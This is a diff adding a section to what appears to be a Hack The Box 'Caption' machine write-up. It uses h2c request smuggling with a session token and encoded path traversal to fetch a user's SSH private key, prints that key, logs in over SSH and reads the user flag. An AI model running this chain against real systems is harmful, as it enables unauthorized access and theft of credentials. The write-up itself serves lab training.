@@ -871,4 +871,67 @@ ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMY5d7Gy
 
 <br />
 
+As we can see the cypher that is being used corresponds to `ecdsa`, is not the typical `rsa`.
 
+This is to important to know if there is going to be an `id_rsa` or `id_ecdsa` in the system.
+
+Obviously, in this case we need to target the last one mentioned:
+
+<br />
+
+```bash
+❯ python3 h2csmuggler.py -x http://caption.htb 'http://caption.htb/download?url=http://localhost:3923/.cpr/%252Fhome%252Fmargo%252F.ssh%252Fid_ecdsa' -H "Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzUxMzE1MjgxfQ.mvCRs4piEnvcTrPfVV8aCrDrQBw2yNLyZPco8eXzNoc"
+...[snip]...
+[INFO] Requesting - /download?url=http://localhost:3923/.cpr/%252Fhome%252Fmargo%252F.ssh%252Fid_ecdsa
+:status: 200
+server: Werkzeug/3.0.1 Python/3.10.12
+date: Mon, 30 Jun 2025 20:24:13 GMT
+content-type: text/html; charset=utf-8
+content-length: 492
+x-varnish: 294967
+age: 0
+via: 1.1 varnish (Varnish/6.6)
+x-cache: MISS
+accept-ranges: bytes
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS1zaGEy
+LW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQTGOXexsvvDi6ef34AqJrlsOKP3cynseip0tX/R+A58
+9sSkErzUOEOJba7G1Ep2TawTJTbWb2KROYrOYLA0zysQAAAAoJxnaNicZ2jYAAAAE2VjZHNhLXNo
+YTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMY5d7Gy+8OLp5/fgComuWw4o/dzKex6KnS1f9H4
+Dnz2xKQSvNQ4Q4ltrsbUSnZNrBMlNtZvYpE5is5gsDTPKxAAAAAgaNaOfcgjzxxq/7lNizdKUj2u
+Zpid9tR/6oub8Y3Jh3cAAAAAAQIDBAUGBwg=
+-----END OPENSSH PRIVATE KEY-----
+```
+
+<br />
+
+Now we can log into the system with `ssh` facilating this key as `margo's` identifier:
+
+<br />
+
+```bash
+❯ ssh -i id_ecdsa margo@caption.htb
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-119-generic x86_64)
+Last login: Tue Sep 10 12:33:42 2024 from 10.10.14.23
+...[snip]...
+margo@caption:~$ id
+uid=1000(margo) gid=1000(margo) groups=1000(margo)
+```
+
+<br />
+
+And get the `user.txt` flag:
+
+<br />
+
+```bash
+margo@caption:~$ cat user.txt 
+89688e3f257199378755ef3ffb7543b8
+```
+
+<br />
+
+# Privilege Escalation: margo -> root
+
+<br />
